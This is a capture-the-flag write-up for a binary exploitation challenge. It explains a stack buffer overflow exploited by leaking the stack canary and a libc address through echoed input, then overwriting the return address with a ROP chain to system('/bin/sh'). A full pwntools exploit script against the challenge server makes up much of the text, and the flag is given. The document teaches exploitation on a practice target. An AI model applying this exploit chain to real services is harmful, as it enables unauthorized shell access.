# Goodbye, Mr. Anderson

So there's some BOF reading functionality, I'm not going to go into detail about how the reading works but just know it essentially takes an amount, and reads that+1 chars into the buffer. The buffer is 24 bytes long and yet we can read 64, then 64, then 128 bytes into it, obviously creating buffer overflow.

So, the solution is like in Skywriting from redpwn. As our input is printed two times before the final input, we can use it to leak by nudging our input up against values, so that null termination is nonexistent and other values become part of the string. This allows us to leak values off the stack. Since we get 3 total of these inputs, the first 2 will be used for leaks whilst the last one is used to overflow the return address.

The buffer is at rbp-0x20, and the canary is at rbp-0x8. As well as this, the return address at rbp+0x8, and is __libc_start_main_ret. So, we can use that to leak libc. We can also leak canary so that we'll keep it constant.

1. Send 0x19 bytes to leak canary(first byte of canary is null, terminating input, so we must overwrite it a little bit so that the rest will be printed along with the string)
2. Send 0x28 bytes to leak libc start main ret and figure out where libc is
3. Send final payload with correct canary and ROP chain that calls system("/bin/sh")

#### Flag: flag{l0tsa_l33ks_4r3_imp0rt4nt}
```py
from pwn import *
context.arch = 'amd64'
e = ELF("./leaks")
p = e.process() if args.LOCAL else remote('chal.ctf.b01lers.com', 1009)
libc = e.libc if args.LOCAL else ELF("./leaks-libc")
libret = 0x270b3 if not args.LOCAL else 0x26e0b
p.recvline()
p.sendline('7')
p.send(b'/bin/sh\x00')
def doleak(data,dorecv=True,debug=False):
    p.sendline(str(len(data) - 1))
    p.send(data)
    if dorecv:
        p.recvuntil(data)
        if debug:
            p.interactive()
        return p.recvline()[:-1]
# Leak out the canary. Canary lies 0x18 bytes from our input, we need 0x19 since the first byte will be null
canleak = b'\x00' + doleak(b'A'*0x19)[:7]
canary = u64(canleak)
log.info(f"Canary: {hex(canary)}")
padding = b'A'*0x18 + p64(canary) + b'A'*8
libcleak = u64(doleak(b'A'*0x28).ljust(8,b'\x00'))
log.info(f"Libc leak: {hex(libcleak)}")
libcbase = libc.address = libcleak - libret
log.info(f"Libc base: {hex(libcbase)}")
rop = ROP(libc)
rop.raw(rop.ret.address)
rop.system(next(libc.search(b"/bin/sh\x00")))
print(rop.dump())
payload = padding + rop.chain()
doleak(payload,False)
p.interactive()
```
